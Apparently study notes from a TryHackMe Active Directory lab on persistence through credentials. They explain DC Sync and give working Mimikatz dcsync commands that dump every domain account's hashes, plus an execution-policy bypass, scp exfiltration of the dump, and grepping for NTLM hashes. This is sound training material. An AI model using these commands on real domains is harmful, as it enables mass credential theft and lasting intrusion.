# Persistence through credentials

It is not sufficient to have a single domain controller per domain in large organisations. These domains are often 
used in multiple regional locations, and having a single DC would significantly delay any authentication services in 
AD. These organisations make use of multiple DCs.

Each domain controller runs a process called the Knowledge Consistency Checker (KCC). The KCC generates a 
replication topology for the AD forest and automatically connects to other domain controllers through Remote 
Procedure Calls (RPC) to synchronise information. This includes updated information such as the user's new 
password and new objects such as when a new user is created.

The process of replication is called DC Synchronisation. It is not just the DCs that can initiate replication. 
Accounts such as those belonging to the Domain Admins groups can also do it for legitimate purposes such as creating 
a new domain controller.

A popular attack to perform is a DC Sync attack. With access to an account that has domain replication permissions, 
it is possible to stage a DC Sync attack to harvest credentials from a DC.

## Passwords

Passwords can easily be changed and will be changed by the blue team when an attacker is discovered. More reliable 
credentials would be:

* Local Administrative Accounts (Could still maintain a presence on multiple machines)
* Delegate Accounts (Given the right delegation, could generate silver or golden tickets)
* AD Service Credentials (WSUS, SCCM, Could force changes on the network)

## Order of Operations

* Use your unprivileged credentials from the distributor to facilitate initial access
* Use the given Administrator credentials to perform privileged operations. Pretend that these are credentials you've 
obtained during the [exploitation phase](../exploit/README.md).

## DC Sync

SSH to `THMWRK1`:

    ssh administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc

To do a DC Sync of a single account DC Sync with Mimikatz, test it on the user credential obtained from the distributor:

```text
powershell.exe -ep bypass

C:\Tools\mimikatz_trunk\x64\mimikatz.exe

mimikatz # lsadump::dcsync /domain:za.tryhackmloc /user:user.name
```

To dcsync all users from the domain controller:

* Specify a log file in the Mimikatz session
* Or, exit Mimikatz and run a one-liner

### Log file

To enable logging on Mimikatz (change `user.name` to the one received from the distributor):

```text
mimikatz # log <user.name>_dcdump.txt 
Using '<user.name>_dcdump.txt' for logfile: OK
```

Use the /all flag:

```text
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
```

Takes a while ... Once done, exit Mimikatz to finalise the dump find.

Download the `<user.name>_dcdump.txt` or `dcsyncall.txt` file:

```text
scp administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc:C:/Users/Administrator.ZA/<user.name>_dcdump.txt .
```

Recover all the usernames:

    cat <user.name>_dcdump.txt | grep "SAM Username"

Recover all hashes:

    cat <user.name>_dcdump.txt | grep "Hash NTLM"

### One-liner

The better solution because it keeps the log files clean:

```text
C:\Tools\mimikatz_trunk\x64\mimikatz.exe 'lsadump::dcsync /domain:za.tryhackme.loc /all' > dcsyncall.txt
```

Download the `dcsyncall.txt` file:

```text
scp administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc:C:/Users/Administrator.ZA/dcsyncall.txt .
```

Remove Windows CRLF line endings and change to utf8 encoding

    dos2unix dcsyncall.txt

Inspect the file with the `less` command, using the arrow keys to navigate, and searching for a term by hitting the 
`/` key:

    less dcsyncall.txt

